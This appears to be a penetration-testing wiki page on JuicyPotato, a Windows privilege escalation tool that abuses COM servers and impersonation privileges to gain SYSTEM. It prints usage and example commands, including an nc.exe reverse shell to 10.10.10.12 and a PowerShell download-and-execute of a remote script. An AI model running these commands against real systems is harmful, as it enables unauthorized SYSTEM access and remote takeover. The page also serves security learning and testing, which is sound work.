# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. _**Check:**_

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<[https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx)>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

We discovered that, other than `BITS` there are a several COM servers we can abuse. They just need to:

1. be instantiable by the current user, normally a “service user” which has impersonation privileges
2. implement the `IMarshal` interface
3. run as an elevated user (SYSTEM, Administrator, …)

After some testing we obtained and tested an extensive list of [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) on several Windows versions.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato allows you to:

- **Target CLSID** _pick any CLSID you want._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _you can find the list organized by OS._
- **COM Listening port** _define COM listening port you prefer (instead of the marshalled hardcoded 6666)_
- **COM Listening IP address** _bind the server on any IP_
- **Process creation mode** _depending on the impersonated user’s privileges you can choose from:_
  - `CreateProcessWithToken` (needs `SeImpersonate`)
  - `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
  - `both`
- **Process to launch** _launch an executable or script if the exploitation succeeds_
- **Process Argument** _customize the launched process arguments_
- **RPC Server address** _for a stealthy approach you can authenticate to an external RPC server_
- **RPC Server port** _useful if you want to authenticate to an external server and firewall is blocking port `135`…_
- **TEST mode** _mainly for testing purposes, i.e. testing CLSIDs. It creates the DCOM and prints the user of token. See_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>

```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```

### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

If the user has `SeImpersonate` or `SeAssignPrimaryToken` privileges then you are **SYSTEM**.

It’s nearly impossible to prevent the abuse of all these COM Servers. You could think about modifying the permissions of these objects via `DCOMCNFG` but good luck, this is gonna be challenging.

The actual solution is to protect sensitive accounts and applications which run under the `* SERVICE` accounts. Stopping `DCOM` would certainly inhibit this exploit but could have a serious impact on the underlying OS.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Examples

Note: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.

### Get a nc.exe reverse shell

```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```

### Powershell rev

```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```

### Launch a new CMD (if you have RDP access)

![](<../../images/image (300).png>)

## CLSID Problems

Oftentimes, the default CLSID that JuicyPotato uses **doesn't work** and the exploit fails. Usually, it takes multiple attempts to find a **working CLSID**. To get a list of CLSIDs to try for a specific operating system, you should visit this page:

{{#ref}}
https://ohpe.it/juicy-potato/CLSID/
{{#endref}}

### **Checking CLSIDs**

First, you will need some executables apart from juicypotato.exe.

Download [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) and load it into your PS session, and download and execute [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). That script will create a list of possible CLSIDs to test.

Then download [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(change the path to the CLSID list and to the juicypotato executable) and execute it. It will start trying every CLSID, and **when the port number changes, it will mean that the CLSID worked**.

**Check** the working CLSIDs **using the parameter -c**

## References

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

{{#include ../../banners/hacktricks-training.md}}
